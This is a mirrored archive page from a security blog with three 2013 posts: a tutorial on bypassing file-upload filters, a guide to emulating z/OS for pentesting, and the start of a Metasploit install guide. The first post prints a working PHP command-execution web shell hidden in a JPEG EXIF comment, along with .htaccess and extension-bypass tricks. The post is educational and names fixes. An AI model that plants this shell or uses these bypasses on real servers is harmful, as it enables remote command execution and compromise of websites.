<!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<link rel="stylesheet" href="../../../css/fontello.css">
<link rel="stylesheet" href="../../../css/animation.css">

<!-- Mirrored from phocean.net/category/security/page/4 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 26 May 2019 07:57:25 GMT -->
<!-- Mirrored from phocean.net/category/security/page/4 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 26 May 2019 07:57:25 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width" />
<title>Security | Phocean.net | Page 4</title>
<link rel="profile" href="http://gmpg.org/xfn/11" />
<link rel="pingback" href="../../../xmlrpc.php" />
<!--[if lt IE 9]>
<script src="/wp-content/themes/twentytwelve/js/html5.js"></script>
<![endif]-->

	  <link rel='dns-prefetch' href='http://fonts.googleapis.com/' />
<link rel='dns-prefetch' href='http://s.w.org/' />
<link href='https://fonts.gstatic.com/' crossorigin rel='preconnect' />
<link rel="alternate" type="application/rss+xml" title="Phocean.net &raquo; Feed" href="/feed" />
<link rel="alternate" type="application/rss+xml" title="Phocean.net &raquo; Security Category Feed" href="../feed" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/phocean.net\/wp-includes\/js\/wp-emoji-release.min.js"}};
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/phocean.net\/wp-includes\/js\/wp-emoji-release.min.js"}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55358,56760,9792,65039],[55358,56760,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='wp-lightbox-2.min.css-css'  href='/wp-content/plugins/wp-lightbox-2/styles/lightbox.min.css?ver=1.3.4' type='text/css' media='all' />
<link rel='stylesheet' id='twentytwelve-fonts-css'  href='https://fonts.googleapis.com/css?family=Open+Sans:400italic,700italic,400,700&amp;subset=latin,latin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='twentytwelve-style-css'  href='/wp-content/themes/twentytwelve-child/style.css?ver=4.9.10' type='text/css' media='all' />
<link rel='stylesheet' id='twentytwelve-block-style-css'  href='/wp-content/themes/twentytwelve/css/blocks.css?ver=20181230' type='text/css' media='all' />
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentytwelve-ie-css'  href='/wp-content/themes/twentytwelve/css/ie.css?ver=20121010' type='text/css' media='all' />
<![endif]-->
<script type='text/javascript' src='/wp-includes/js/jquery/jquery.js'></script>
<script type='text/javascript' src='/wp-includes/js/jquery/jquery-migrate.min.js'></script>
<link rel='https://api.w.org/' href='../../../wp-json/index.html' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../../xmlrpc0db0.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 4.9.10" />
	<style type="text/css" id="twentytwelve-header-css">
			.site-header h1 a,
		.site-header h2 {
			color: #627690;
		}
		</style>
	</head>

<body class="archive paged category category-security category-17 paged-4 category-paged-4 full-width custom-font-enabled single-author">
<div id="page" class="hfeed site">
	<header id="masthead" class="site-header" role="banner">
		<hgroup>
                        <div style="float:left">

			<a href="../../../index.html" >
			<img class="logo" src="../../../logo.svg" width="119" height="77" onerror="this.removeAttribute('onerror'); this.src='../../../logo.html'" />
			</a>

                        <!--<img src="/wp-content/themes/twentytwelve-child/logo.png" style="vertical-align:middle;"/>-->

                        </div>
                        <div style="float:left">
                        <h1 class="site-title">
                      <span><a href="../../../index.html" title="Phocean.net" rel="home">
                        Phocean.net</a></span></h1>
			<h2 class="site-description">Computer Security Blog</h2>
                </div>
		<div style="float:right;overflow:hidden;word-wrap: break-word;">
			<form role="search" method="get" id="searchform" class="searchform" action="/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form>		</div>
		</hgroup>

                <div style="clear:both"></div>
		<nav id="site-navigation" class="main-navigation" role="navigation">
			<h3 class="menu-toggle">Menu</h3>
			<a class="assistive-text" href="#content" title="Skip to content">Skip to content</a>
			<div class="menu-top-container"><ul id="menu-top" class="nav-menu"><li id="menu-item-1527" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1527"><a href="../../../index.html"><i class="icon-home"></i> Blog</a></li>
<li id="menu-item-1919" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1919"><a href="../../../archives.html"><i class="icon-archive"></i> Archives</a></li>
<li id="menu-item-1525" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1525"><a href="../../../tools.html"><i class="icon-beaker"></i> Code</a></li>
<li id="menu-item-1559" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1559"><a href="../../../docs.html"><i class="icon-doc"></i> Docs</a></li>
<li id="menu-item-1526" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1526"><a href="../../../about.html"><i class="icon-user"></i> About</a></li>
<li id="menu-item-1809" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1809"><a href="http://twitter.com/_phocean"><i class="icon-twitter-1"></i> Twitter</a></li>
<li id="menu-item-1810" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1810"><a href="../../../indexcc4d.html?feed=rss"><i class="icon-rss"></i> RSS</a></li>
</ul></div>		</nav><!-- #site-navigation -->

			</header><!-- #masthead -->

	<div id="main" class="wrapper">
	<section id="primary" class="site-content">
		<div id="content" role="main">

					<header class="archive-header">
				<h1 class="archive-title">Category Archives: <span>Security</span></h1>

						</header><!-- .archive-header -->

			
	<article id="post-1666" class="post-1666 post type-post status-publish format-standard hentry category-pentesting category-security tag-file-upload tag-pentest tag-php tag-vulnerability tag-web-2">
				<header class="entry-header">

						<h1 class="entry-title">
				<a href="../../../2013/09/29/file-upload-vulnerabilities-appending-php-code-to-an-image.html" title="Permalink to File upload vulnerabilities : appending PHP code to an image" rel="bookmark">File upload vulnerabilities : appending PHP code to an image</a>
			</h1>
								</header><!-- .entry-header -->

				<div class="entry-content">
			<!-- Adds 140x140 featured image to single post view -->
			<div class="excerpt-thumb">
							</div>
			<p>Several ways may be used to protect a file upload functionality on a website.</p>
<p>A first method is <strong>content-type </strong>checking, which can be easily bypassed with a intercepting proxy (tampering the MIME type). The screenshot below shows an intercepted request where the attacker modifies the content-type (beforehand <code>text/php</code>) and then forwards the content to the server:</p>
<div id="attachment_1667" style="width: 590px" class="wp-caption aligncenter"><img class="size-medium wp-image-1667" alt="HTTP POST content-type tampering" src="../../../wp-content/uploads/2013/09/CapturFiles_13-580x313.png" width="580" height="313" srcset="/wp-content/uploads/2013/09/CapturFiles_13-580x313.png 580w, /wp-content/uploads/2013/09/CapturFiles_13-624x337.png 624w, /wp-content/uploads/2013/09/CapturFiles_13.png 902w" sizes="(max-width: 580px) 100vw, 580px" /><p class="wp-caption-text">HTTP POST content-type tampering</p></div>
<p>Thus, the content-type filtering is bypassed.</p>
<p>Another method consists in checking the file name <strong>extension</strong>. If simple bypasses like playing with lowercase (<code>.PHP</code> instead of <code>.php</code>), using multiple extension (<code>.php.foo</code>) or triggering the NULL byte (<code>.php%00.jpg</code>) do not work, there is a last chance by uploading a crafted image.</p>
<p>JPEG files are convenient for code injection: they support EXIF metadata, which include a <em>comment</em> field where anything can be written, as long as it is on a single line.</p>
<p>So, when a web server parses the image content, it may interpret the PHP code inside if it is improperly secured.</p>
<p>The method is however totally dependent on the ability to upload a <code>.htaccess</code> file, which may be a long way to go.</p>
<p>Though, one advantage of using an image in most upload vulnerability exploitation cases is stealth: an image will always look less suspicious than a dropped <code>.php</code> file.</p>
<p>Anyway, for fun, here is how to do:</p>
<ol class="split start">
<li>Upload a <code>.htaccess</code> file that contains:
<pre>AddType application/x-httpd-php .jpg</pre>
</li>
<li>Take a JPEG file of your choice, install the <a title="Jhead" href="http://www.sentex.net/~mwandel/jhead/">jhead</a> tool (there are many alternatives, like <a title="exiftool" href="http://www.sno.phy.queensu.ca/~phil/exiftool/">exiftool</a>, but this one is straightforward).</li>
<li>House-keeping (delete extra headers):
<pre>jhead -purejpg &lt;filename&gt;.jpg</pre>
</li>
<li>Edit EXIF JPEG comment:
<pre>jhead -ce &lt;filename&gt;.jpg</pre>
</li>
<li>Copy / paste your PHP code, like this one for instance (must fit in one line):
<pre>&lt;style&gt;body{font-size: 0;}h1{font-size: 12px}&lt;/style&gt;&lt;h1&gt;&lt;?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo '&lt;img src="./clean_imagejs';}__halt_compiler();?&gt;&lt;/h1&gt;</pre>
<p>This code just reads a command from the cmd parameter when it is set. If it is absent, then for more discretion it displays another image (clean_image.jpg, that you would have uploaded previously, for instance). The CSS style trick (font size of 0) just hides some garbage that comes from the JPEG header.</li>
<li>Just upload the file and test it! <a title="DVWA" href="http://www.dvwa.co.uk/">DVWA</a> is a convenient and safe way for that.</li>
</ol>
<p>Note this <a title="php image upload security how not to do it" href="http://nullcandy.com/php-image-upload-security-how-not-to-do-it/">nice article</a> as a reference on the topic, and the solution that is suggested to fix such a vulnerability: disabling one way or another script execution on the upload directory and use random server-side file renaming.</p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
			<i class="icon-folder-open-empty"></i> <a href="../pentesting.html" rel="category tag">Pentesting</a>, <a href="../../security.html" rel="category tag">Security</a> <i class="icon-tag"></i> <a href="../../../tag/file-upload.html" rel="tag">file upload</a>, <a href="../../../tag/pentest.html" rel="tag">pentest</a>, <a href="../../../tag/php.html" rel="tag">PHP</a>, <a href="../../../tag/vulnerability.html" rel="tag">Vulnerability</a>, <a href="../../../tag/web-2.html" rel="tag">web</a> <i class="icon-calendar"></i> <a href="../../../2013/09/29/file-upload-vulnerabilities-appending-php-code-to-an-image.html" title="11:03 pm" rel="bookmark"><time class="entry-date" datetime="2013-09-29T23:03:05+00:00">September 29, 2013</time></a><span class="by-author"> by <span class="author vcard"><a class="url fn n" href="../../../author/jc.html" title="View all posts by phocean" rel="author">phocean</a></span></span>.								</footer><!-- .entry-meta -->
	</article><!-- #post -->
	<article id="post-1587" class="post-1587 post type-post status-publish format-standard hentry category-pentesting category-security category-administration-systeme category-virtualization tag-hercules390 tag-ispf tag-mac-os-x tag-mainframe tag-network tag-pentest tag-simulation tag-tn3270 tag-tso tag-tun tag-unix tag-zos">
				<header class="entry-header">

						<h1 class="entry-title">
				<a href="../../../2013/05/28/my-goodness-i-got-mainframed.html" title="Permalink to My goodness, I got mainframed!" rel="bookmark">My goodness, I got mainframed!</a>
			</h1>
								</header><!-- .entry-header -->

				<div class="entry-content">
			<!-- Adds 140x140 featured image to single post view -->
			<div class="excerpt-thumb">
							</div>
			<p>Mainframes are not dead, why not pentesting it?</p>
<p>I just watched the presentation of <strong>Phil Young</strong> at <a href="https://www.shmoocon.org/shmoocon_2013" target="_blank">Shmoocon 2013</a>: &#8220;<a href="https://www.shmoocon.org/2013/videos/Shmoocon 2013 - Mainframed The Secrets Inside that Black Box.mp4" target="_blank">Mainframed: the secrets inside that black box</a>&#8220;. I truly loved it. I thought mainframes where disappearing, but I was surprised to see that it still alive. I was even more surprised to find out that they have some Unix interface, and that there is a emulator for x86. Where it was less of a surprise is that their security is pretty low :-)</p>
<p>Anyway, don&#8217;t miss watching the video. <a href="http://mainframed767.tumblr.com/" target="_blank">Phil&#8217;s blog, &#8220;Soldier of Fortran&#8221;</a>, is also a gold mine, he wrote many tips, tutos and tools.</p>
<p>It made me very curious and just in case I find some IBM Z/OS during a pentest, I though it would be nice to run it.</p>
<h1>Installing</h1>
<blockquote><p>Disclaimer:</p>
<p>Although some Z/OS files are available for download on the Internet, you must own a legal license of Z/OS. This tutorial is exclusively for education-purpose, use it only for testing, never in production nor for illegal activities.</p>
<p>Also, I am a noob in the area. So if some of you are skilled and find mistakes or improvements, please let me know in the comments. I give a great importance to your feedback and it encourages me to continue.</p></blockquote>
<p>I glued the pieces in the following steps (Mac OS oriented and tested only with it, the same should work for Linux with minor adjustments and see the reference otherwise):</p>
<ol class="split start">
<li>Download and install <a href="http://www.brown.edu/cis/tn3270/" target="_blank">tn3270</a> (Mac) or <a href="http://x3270.bgp.nu/download.html" target="_blank">x3270</a> (Windows, Linux, Mac): this will be the client terminal used to connect to the mainframe.</li>
<li>Download the emulator, <a href="http://www.hercules-390.eu/" target="_blank">Hercules</a>. Install it, following the README instructions relevant to your system. Note that the instructions for Mac OS are outdated and won&#8217;t work. I followed Phil&#8217;s instructions:</li>
</ol>
<pre>git clone git://github.com/s390guy/hercules-390.git
cd hercules-390
sh autogen.sh
./configure
make
make install</pre>
<ol class="split">
<li>Take some IBM Z/OS release, and install it:</li>
</ol>
<pre>mv IBM\ ZOS\ 1.10/Z110SA/images/Z110\ -\ Copy /YOUR/PATH/HERE/Z110
cd /YOUR/PATH/HERE/Z110
mkdir PRTR
cd CONF
cp ADCD_LINUX.CONF ADCD_MAC.CONF
sed -i '' 's/\/home\/ehrocha\/hercules\/images/\/YOUR\/PATH\/HERE/g' ADCD_MAC.CONF
sed -i '' 's/CNSLPORT \{2\}23/CNSLPORT  3270/g' ADCD_MAC.CONF
sed -i '' 's/0E20.2   LCS  10.0.1.20/0E20.2 3088 CTCI \/dev\/tun0 1500 10.10.10.11 10.10.10.12 255.255.255.255/g' ADCD_MAC.CONF</pre>
<ol class="split">
<li>Getting the network to work on Mac OS require some extra steps (skip it if your are using Linux).</li>
</ol>
<p><a href="http://sourceforge.net/projects/tuntaposx/files/tuntap/20111101/">Download tuntaposx</a>, uncompress and install the package. No reboot it necessary, you should now have plenty of tun* (and tap*) interfaces:</p>
<pre>$ ls /dev/tun*
/dev/tun0 /dev/tun10 /dev/tun12 /dev/tun14 /dev/tun2 /dev/tun4 /dev/tun6 /dev/tun8
/dev/tun1 /dev/tun11 /dev/tun13 /dev/tun15 /dev/tun3 /dev/tun5 /dev/tun7 /dev/tun9</pre>
<ol class="split">
<li>Okay, now we can start the emulator (we need to sudo to access to the tun0 interface, among other reasons):</li>
</ol>
<pre>sudo hercules -f ADCD_MAC.CONF</pre>
<p>First of all, checks that the network is fine:</p>
<pre># From Mac OS:
$ ifconfig tun0
tun0: flags=8851&lt;UP,POINTOPOINT,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500
 inet 10.10.10.12 --&gt; 10.10.10.11 netmask 0xff000000 
 open (pid 98687)

# From Hercules:
herc =====&gt; devlist
[...]
HHC02279I 0:0E20 3088 CTCI 10.10.10.11/10.10.10.12 (tun0) IO[0] open
HHC02279I 0:0E21 3088 CTCI 10.10.10.11/10.10.10.12 (tun0) IO[0] open</pre>
<p>Open <strong>tn3270</strong> and connect with default settings on localhost:</p>
<p><img class="size-full wp-image-1601 aligncenter" alt="tn3270 connection" src="../../../wp-content/uploads/2013/05/tn3270-connection.png" width="423" height="219" /></p>
<p>And then in the hercules terminal, enter <code>ipl a80</code></p>
<div id="attachment_1602" style="width: 590px" class="wp-caption aligncenter"><img class="size-medium wp-image-1602 " alt="boot zos" src="../../../wp-content/uploads/2013/05/boot-zos-580x474.png" width="580" height="474" srcset="/wp-content/uploads/2013/05/boot-zos-580x474.png 580w, /wp-content/uploads/2013/05/boot-zos-624x510.png 624w, /wp-content/uploads/2013/05/boot-zos.png 775w" sizes="(max-width: 580px) 100vw, 580px" /><p class="wp-caption-text">Hercules390 console: booting Z/OS</p></div>
<p><strong>It is very long to boot, don&#8217;t worry. You will actually have to use 2 terminals</strong>, so open the second one, which will show the logon screen (see screenshot below) after booting is done. It will be used for &#8220;userland&#8221; aka TSO commands.</p>
<p>The first terminal shall be kept open as the master console, which receive system logs and can be used for &#8220;system-level&#8221;* commands (e.g root level).</p>
<div id="attachment_1620" style="width: 590px" class="wp-caption aligncenter"><a href="../../../wp-content/uploads/2013/05/logon-screen.png" rel="lightbox[1587]"><img class="size-medium wp-image-1620" alt="Z/OS &quot;Duza&quot; logon screen" src="../../../wp-content/uploads/2013/05/logon-screen-580x462.png" width="580" height="462" srcset="/wp-content/uploads/2013/05/logon-screen-580x462.png 580w, /wp-content/uploads/2013/05/logon-screen-624x498.png 624w, /wp-content/uploads/2013/05/logon-screen.png 684w" sizes="(max-width: 580px) 100vw, 580px" /></a><p class="wp-caption-text">Z/OS &#8220;Duza&#8221; logon screen</p></div>
<ol class="split">
<li>At the prompt, enter <code>TSO</code>, then <code>IBMUSER</code> as the login, and <code>SYS1</code> as the password. It will automatically launch the ISPF menu:</li>
</ol>
<div id="attachment_1619" style="width: 590px" class="wp-caption aligncenter"><a href="../../../wp-content/uploads/2013/05/ispf.png" rel="lightbox[1587]"><img class="size-medium wp-image-1619" alt="ISPF menu" src="../../../wp-content/uploads/2013/05/ispf-580x462.png" width="580" height="462" srcset="/wp-content/uploads/2013/05/ispf-580x462.png 580w, /wp-content/uploads/2013/05/ispf-624x498.png 624w, /wp-content/uploads/2013/05/ispf.png 684w" sizes="(max-width: 580px) 100vw, 580px" /></a><p class="wp-caption-text">ISPF menu</p></div>
<ol class="split">
<li>Now, you are good to go ahead with Z/OS commands&#8230;</li>
</ol>
<p>This video demonstrates the boot process:</p>
<p><iframe src="http://player.vimeo.com/video/67114095" height="281" width="500" allowfullscreen="" frameborder="0"></iframe></p>
<p><a href="http://vimeo.com/67114095">Z/OS emulation with Hercules390</a> from <a href="http://vimeo.com/user12629826">phocean</a> on <a href="http://vimeo.com/">Vimeo</a>.</p>
<ol class="split">
<li>Now, let&#8217;s get the network up.</li>
</ol>
<p><strong>Prepare Mac OS</strong>:</p>
<ul>
<li>Make sure that the Mac OS firewall is deactivated or/and that you configured pf to allow the <code>tun0</code> interface (another article coming soon on this topic).</li>
<li>Add a route to <code>tun0</code></li>
</ul>
<pre>sudo route add -net 10.10.10.0/24 -interface tun0</pre>
<ul>
<li><span style="line-height: 14px;">You may want to activate ip forwarding, to have the Z/OS reach other interfaces through the kernel:</span></li>
</ul>
<pre>sudo sysctl -w net.inet.ip.forwarding=1</pre>
<p>Now every thing is in place to allow the mainframe to reach the outside. Further routing considerations are outside the scope of this article.</p>
<p><strong>Prepare Z/OS</strong>:</p>
<ul>
<li>In TSO menu, choose 3 (utilities), 4 (Dslist)</li>
<li>Click on the line besides <code>Dsname Level</code> and type-in <code>ADCD</code> and then press <code>[Enter]</code>. ADCD is what is called a dataset.</li>
<li>In the Command column, on the left of <code>ADCD.Z110S.PROCLIB</code>, type in <code>e</code> (stands for edit, reproduce the same pattern when I say &#8220;edit&#8221; in the following steps)</li>
<li>Edit the TCPIP member, and make sure that the <code>//PROFILE</code> line looks like this:</li>
</ul>
<pre>//PROFILE DD DISP=SHR,DSN=ADCD.Z110S.TCPPARMS(DUZA)</pre>
<p>You could change the <code>DUZA</code> string, but you would have to make sure that the corresponding profile exists in <code>ADCD.Z110S.TCPPARMS</code> (see TODO section).</p>
<ul>
<li>Go back to <code>Dslist</code> page using end or exit as a command. This time, type <code>DUZA</code> as dataset.</li>
<li>Edit the <code>TCPARMS</code> member, then <code>PROFILE</code>. Once in the file, edit carefuly the following lines (at the bottom, around line 90):</li>
</ul>
<pre>000090 DEVICE CTCA1 CTC e20
000091 LINK CTC1 CTC 1 CTCA1
000092
000093 HOME
000094    10.10.10.11  CTC1
000095
000096 GATEWAY
000097    10.10.10.12  = CTC1 1492 HOST
000098
000099 DEFAULTNET 10.10.10.12 CTC1 1492 0
[...]
000109 START CTCA1</pre>
<ul>
<li>In the console window, restart the network stack:</li>
</ul>
<pre>stop tcpip
# wait for termination message
start tcpip</pre>
<ul>
<li>If every is going well, the tunnel should get up and you should be able to ping both side (use the ping command in Z/OS from the command menu).</li>
</ul>
<p>This video illustrates some of this networking stuff:</p>
<p><iframe src="http://player.vimeo.com/video/69912699" height="281" width="500" allowfullscreen="" frameborder="0"></iframe></p>
<p><a href="http://vimeo.com/69912699">Hercules390 and Z/OS, getting the network up</a> from <a href="http://vimeo.com/user12629826">phocean</a> on <a href="http://vimeo.com/">Vimeo</a>.</p>
<h1>Useful commands</h1>
<ul>
<li>Ifconfig</li>
</ul>
<pre>netstat home</pre>
<ul>
<li>Shutdown</li>
</ul>
<pre># in "system" terminal:
S SHUTSYS
Z EOD

# then, once finished, in Hercules:
exit</pre>
<h1>Tips</h1>
<ul>
<li>I was stuck at an early moment during the boot process with:</li>
</ul>
<pre>IXC208I THE RESPONSE TO MESSAGE IXC420D IS INCORRECT: IS NOT A VALID 
ACTION 
 IXC420D REPLY I TO INITIALIZE SYSPLEX ADCDPL, OR R TO REINITIALIZE 
XCF.     
  REPLYING I WILL IMPACT OTHER ACTIVE SYSTEMS.</pre>
<p>You can go over it by entering this in your terminal session (tn3270):</p>
<pre>R 00, I</pre>
<ul>
<li><span style="line-height: 14px;">After the long process, I actually had to open a second connection with the terminal to get the logon screen. So, just check from time to time instead of waiting for nothing in front of the first window.</span></li>
<li>To logoff, type <code>X</code> from the ISPF main menu. The first time, you have to configure the printer. Choose <code>LOCAL</code> as print mode, and give it any name as <code>Local printer ID</code>. Then press <code>[Enter]</code>, and if you are asked for a <code>sysout class</code>, choose <code>"J"</code>. You should be back in TSO, where you can execute <code>logoff</code>. Next time, it will default to these values, so you should get straight from ISPF to TSO.</li>
<li>Don&#8217;t forget that TSO is a CLI where you can type Z/OS and Unix commands. You actually don&#8217;t need or have to use ISPF, so don&#8217;t hesitate to use it!</li>
</ul>
<p>Of course, a good source of information is the <a href="http://publib.boulder.ibm.com/infocenter/zos/basics/index.js">hercules390 forum</a> may also be of help.</p>
<p>Voilà, happy hacking! WTF, it seems I got mainframed too! Did you?</p>
<p>Big thanks again to Phil Young for catching our attention on this stuff.</p>
<h1>TODO</h1>
<ul>
<li><span style="line-height: 14px;">Understand and get rid off the DUZO profile: you probably noticed that we are using the DUZO  profile to load the network stack (which is after the name of the torrent, and does probably more stuff behind). For example, there is no DUZO profile in ADCD.Z110S.TCPPARMS, so I still have no idea how it actually gets loaded. It has been only 2 days that I work on Z/OS, so I still have to read the doc (and any help is welcome).</span></li>
<li>Change the logon screen (see references).</li>
</ul>
<h1>References</h1>
<ul>
<li><a href="http://mainframed767.tumblr.com/post/27787457789/hercules-3-08-on-mac-os-x-lion" target="_blank">Hercules 3.08 on Mac OS X Lion</a></li>
<li><a href="http://mainframed767.tumblr.com/post/40836059586/instructions-to-installing-z-os-in-hercules" target="_blank">Instructions to installing z/OS in Hercules</a></li>
<li><a href="http://pastebin.com/raw.php?i=PHiT8jmE" target="_blank">Installin&#8217; that sweet sweet big iron on your Linux laptop or server</a> (<a href="../../../wp-content/uploads/2013/05/install_zOS_in_Hercules.txt">local mirror</a>)</li>
<li><a href="http://kat.ph/ibm-z-os-emulation-files-t5780374.html" target="_blank">Z/OS files</a></li>
<li><a href="http://patata.homeip.net/blog/hercules-and-zos-tcp-ip-networking-for-adcd-versions" target="_blank">Hercules and Z/OS TCP/IP networking for ADCD versions</a></li>
<li><a href="http://mainframed.wordpress.com/2012/06/17/changing-the-logon-screen-on-the-mainframe-zos-vtam-in-adcd/" target="_blank">Changing the logon screen on the mainframe</a></li>
<li><a href="http://tuntaposx.sourceforge.net/">tuntaposx</a></li>
<li><a href="http://www.js">TSO tutorial</a></li>
<li><a href="http://answers.uchicago.edu/page.php?id=19482#GETTINGM" target="_blank">Mainframe &#8211; using TSO and ISPF</a></li>
<li><a href="http://publib.boulder.ibm.com/infocenter/zos/basics/index.js">IBM online documentation</a></li>
</ul>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
			<i class="icon-folder-open-empty"></i> <a href="../pentesting.html" rel="category tag">Pentesting</a>, <a href="../../security.html" rel="category tag">Security</a>, <a href="../../administration-systeme.html" rel="category tag">System</a>, <a href="../../administration-systeme/virtualization.html" rel="category tag">Virtualization</a> <i class="icon-tag"></i> <a href="../../../tag/hercules390.html" rel="tag">hercules390</a>, <a href="../../../tag/ispf.html" rel="tag">ISPF</a>, <a href="../../../tag/mac-os-x.html" rel="tag">Mac OS X</a>, <a href="../../../tag/mainframe.html" rel="tag">mainframe</a>, <a href="../../../tag/network.html" rel="tag">Network</a>, <a href="../../../tag/pentest.html" rel="tag">pentest</a>, <a href="../../../tag/simulation.html" rel="tag">simulation</a>, <a href="../../../tag/tn3270.html" rel="tag">tn3270</a>, <a href="../../../tag/tso.html" rel="tag">TSO</a>, <a href="../../../tag/tun.html" rel="tag">tun</a>, <a href="../../../tag/unix.html" rel="tag">unix</a>, <a href="../../../tag/zos.html" rel="tag">z/os</a> <i class="icon-calendar"></i> <a href="../../../2013/05/28/my-goodness-i-got-mainframed.html" title="2:20 pm" rel="bookmark"><time class="entry-date" datetime="2013-05-28T14:20:17+00:00">May 28, 2013</time></a><span class="by-author"> by <span class="author vcard"><a class="url fn n" href="../../../author/jc.html" title="View all posts by phocean" rel="author">phocean</a></span></span>.								</footer><!-- .entry-meta -->
	</article><!-- #post -->
	<article id="post-1571" class="post-1571 post type-post status-publish format-standard hentry category-mac-os category-pentesting category-security tag-mac-os-x tag-metasploit tag-rbenv tag-ruby tag-zsh">
				<header class="entry-header">

						<h1 class="entry-title">
				<a href="../../../2013/05/05/installing-metasploit-on-os-x-mountain-lion.html" title="Permalink to Installing Metasploit on Mac OS X [Mountain Lion]" rel="bookmark">Installing Metasploit on Mac OS X [Mountain Lion]</a>
			</h1>
								</header><!-- .entry-header -->

				<div class="entry-content">
			<!-- Adds 140x140 featured image to single post view -->
			<div class="excerpt-thumb">
							</div>
			<p><!--StartFragment-->It happened to me a little more complex than expected, so I thought it would deserve a post. There are a few <a href="http://www.darkoperator.com/installing-metasploit-in-ubunt/">good</a> <a href="http://briancanfixit.blogspot.fr/2011/12/setting-up-metasploit-and-armitage-on.html">tutorials</a> already, but they actually did not work flawlessly for me. So while this post is mostly based on them, there are some slight differences.</p>
<h1>Getting Metasploit</h1>
<p>First, let&#8217;s fetch Metasploit. Adjust the last two lines by replacing <code>.zshrc</code> (I am using Zsh) with <code>.bash_profile</code> if you are using Bash, for instance.</p>
<p>This will download, create symlinks and set the database settings path (we will come back on it later) in your environment:</p>
<pre>cd /usr/local/share/
git clone https://github.com/rapid7/metasploit-framework.git
cd metasploit-framework
for MSF in $(ls msf*); do ln -s /usr/local/share/metasploit-framework/$MSF /usr/local/bin/$MSF;done
ln -s /usr/local/share/metasploit-framework/armitage /usr/local/bin/armitage
echo export MSF_DATABASE_CONFIG=/usr/local/share/metasploit-framework/config/database.yml &gt;&gt; ~/.zshrc
source ~/.zshrc</pre>
<p>Metasploit is almost ready, but don&#8217;t run anything yet. There a still quite a few steps&#8230;</p>
<h1>Getting Postgres</h1>
<p>We use Homebrew:</p>
<pre>brew install postgresql --without-ossp-build</pre>
<p>Initialization stuff:</p>
<pre>initdb /usr/local/var/postgres</pre>
<p>To have launchd start postgresql at login:</p>
<pre>ln -sfv /usr/local/opt/postgresql/*.plist ~/Library/LaunchAgents</pre>
<p>But I prefer to keep my startup clean, so I added two aliases in my <code>.zshrc</code></p>
<pre>alias pg_start='pg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log start'
alias pg_stop='pg_ctl stop'</pre>
